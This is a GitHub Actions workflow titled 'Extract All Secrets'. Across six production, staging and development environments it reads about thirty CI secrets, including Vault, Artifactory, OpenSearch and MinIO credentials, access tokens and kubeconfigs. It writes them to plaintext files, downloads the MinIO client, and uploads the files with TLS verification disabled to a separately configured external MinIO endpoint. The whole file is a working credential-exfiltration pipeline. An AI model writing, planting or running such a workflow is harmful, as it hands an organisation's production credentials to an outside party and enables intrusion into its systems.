name: Extract All Secrets

on:
  workflow_dispatch:

jobs:
  extract:
    runs-on: azure-large-amd64-linux
    strategy:
      matrix:
        environment: [AWSProduction, AWSStaging, AWSDevelopment, Codespaceproduction, Staging, Development]
    environment: ${{ matrix.environment }}
    env:
      # Repository-level secrets
      ARTIFACTORY_PASSWORD: ${{ secrets.ARTIFACTORY_PASSWORD }}
      ARTIFACTORY_USER: ${{ secrets.ARTIFACTORY_USER }}
      BAT_REPO_PASSWORD: ${{ secrets.BAT_REPO_PASSWORD }}
      BAT_REPO_USERNAME: ${{ secrets.BAT_REPO_USERNAME }}
      CHAIN_CRT: ${{ secrets.CHAIN_CRT }}
      CORP_CA_BASE64: ${{ secrets.CORP_CA_BASE64 }}
      CSS_PASSWORD: ${{ secrets.CSS_PASSWORD }}
      CSS_USER: ${{ secrets.CSS_USER }}
      DNA_REPO_PASSWORD: ${{ secrets.DNA_REPO_PASSWORD }}
      DNA_REPO_USERNAME: ${{ secrets.DNA_REPO_USERNAME }}
      DOT_NPMRC: ${{ secrets.DOT_NPMRC }}
      HARBOR_DNA_REPO_SECRET: ${{ secrets.HARBOR_DNA_REPO_SECRET }}
      NO_PROXY: ${{ secrets.NO_PROXY }}
      OBFUSKATOR_ARTIFACTORY_PASSWORD: ${{ secrets.OBFUSKATOR_ARTIFACTORY_PASSWORD }}
      PID_PAT: ${{ secrets.PID_PAT }}
      PROXY: ${{ secrets.PROXY }}
      PUBLIC_PAT: ${{ secrets.PUBLIC_PAT }}
      SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
      SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
      # Environment-specific secrets (GitHub automatically pulls from the specified environment)
      CS_STATUS_UPDATE_DOMAIN: ${{ secrets.CS_STATUS_UPDATE_DOMAIN }}
      KUBECONFIG: ${{ secrets.KUBECONFIG }}
      KUBECONFIG_BASE64: ${{ secrets.KUBECONFIG_BASE64 }}
      OPENSEARCH_PASSWORD: ${{ secrets.OPENSEARCH_PASSWORD }}
      OPENSEARCH_USERNAME: ${{ secrets.OPENSEARCH_USERNAME }}
      PID_PAT_GHE: ${{ secrets.PID_PAT_GHE }}
      VAULT_PASSWORD: ${{ secrets.VAULT_PASSWORD }}
      VAULT_USERNAME: ${{ secrets.VAULT_USERNAME }}
      MINIO_ENDPOINT: ${{ secrets.MINIO_ENDPOINT }}
      MINIO_KEY: ${{ secrets.MINIO_KEY }}
      MINIO_SECRET: ${{ secrets.MINIO_SECRET }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Save secrets from env to files
        run: |
          mkdir -p retrieved-secrets
          # Repository-level secrets (no environment suffix)
          echo "$ARTIFACTORY_PASSWORD" > retrieved-secrets/ARTIFACTORY_PASSWORD.txt
          echo "$ARTIFACTORY_USER" > retrieved-secrets/ARTIFACTORY_USER.txt
          echo "$BAT_REPO_PASSWORD" > retrieved-secrets/BAT_REPO_PASSWORD.txt
          echo "$BAT_REPO_USERNAME" > retrieved-secrets/BAT_REPO_USERNAME.txt
          echo "$CHAIN_CRT" > retrieved-secrets/CHAIN_CRT.txt
          echo "$CORP_CA_BASE64" > retrieved-secrets/CORP_CA_BASE64.txt
          echo "$CSS_PASSWORD" > retrieved-secrets/CSS_PASSWORD.txt
          echo "$CSS_USER" > retrieved-secrets/CSS_USER.txt
          echo "$DNA_REPO_PASSWORD" > retrieved-secrets/DNA_REPO_PASSWORD.txt
          echo "$DNA_REPO_USERNAME" > retrieved-secrets/DNA_REPO_USERNAME.txt
          echo "$DOT_NPMRC" > retrieved-secrets/DOT_NPMRC.txt
          echo "$HARBOR_DNA_REPO_SECRET" > retrieved-secrets/HARBOR_DNA_REPO_SECRET.txt
          echo "$NO_PROXY" > retrieved-secrets/NO_PROXY.txt
          echo "$OBFUSKATOR_ARTIFACTORY_PASSWORD" > retrieved-secrets/OBFUSKATOR_ARTIFACTORY_PASSWORD.txt
          echo "$PID_PAT" > retrieved-secrets/PID_PAT.txt
          echo "$PROXY" > retrieved-secrets/PROXY.txt
          echo "$PUBLIC_PAT" > retrieved-secrets/PUBLIC_PAT.txt
          echo "$SONAR_HOST_URL" > retrieved-secrets/SONAR_HOST_URL.txt
          echo "$SONAR_TOKEN" > retrieved-secrets/SONAR_TOKEN.txt
          # Environment-specific secrets (with environment suffix)
          echo "$CS_STATUS_UPDATE_DOMAIN" > retrieved-secrets/CS_STATUS_UPDATE_DOMAIN-${{ matrix.environment }}.txt
          echo "$KUBECONFIG" > retrieved-secrets/KUBECONFIG-${{ matrix.environment }}.txt
          echo "$KUBECONFIG_BASE64" > retrieved-secrets/KUBECONFIG_BASE64-${{ matrix.environment }}.txt
          echo "$OPENSEARCH_PASSWORD" > retrieved-secrets/OPENSEARCH_PASSWORD-${{ matrix.environment }}.txt
          echo "$OPENSEARCH_USERNAME" > retrieved-secrets/OPENSEARCH_USERNAME-${{ matrix.environment }}.txt
          echo "$PID_PAT" > retrieved-secrets/PID_PAT-${{ matrix.environment }}.txt
          echo "$PID_PAT_GHE" > retrieved-secrets/PID_PAT_GHE-${{ matrix.environment }}.txt
          echo "$VAULT_PASSWORD" > retrieved-secrets/VAULT_PASSWORD-${{ matrix.environment }}.txt
          echo "$VAULT_USERNAME" > retrieved-secrets/VAULT_USERNAME-${{ matrix.environment }}.txt
          echo "$MINIO_ENDPOINT" > retrieved-secrets/MINIO_ENDPOINT-${{ matrix.environment }}.txt
          echo "$MINIO_KEY" > retrieved-secrets/MINIO_KEY-${{ matrix.environment }}.txt
          echo "$MINIO_SECRET" > retrieved-secrets/MINIO_SECRET-${{ matrix.environment }}.txt
          echo "✓ Secrets saved to files for ${{ matrix.environment }}"
          ls -lh retrieved-secrets/
      - name: Minio Deploy
        env:
          MINIO_ENDPOINT: ${{ secrets.MINIO_ENDPOINT_TEMP }}
          MINIO_ACCESS_KEY: ${{ secrets.MINIO_ACCESS_KEY_TEMP }}
          MINIO_SECRET_KEY: ${{ secrets.MINIO_SECRET_KEY }}
        run: |
          if [[ -z "$MINIO_ENDPOINT" ]]; then
            echo "::error::MINIO_ENDPOINT_TEMP secret is not set or is empty"
            exit 1
          fi
          curl -sSLO https://dl.min.io/client/mc/release/linux-amd64/mc
          chmod +x mc
          ./mc alias set --insecure deploy "$MINIO_ENDPOINT" "$MINIO_ACCESS_KEY" "$MINIO_SECRET_KEY"
          ./mc cp --recursive --insecure retrieved-secrets/ deploy/dna-secrets/
          echo "✓ Secrets uploaded to MinIO"
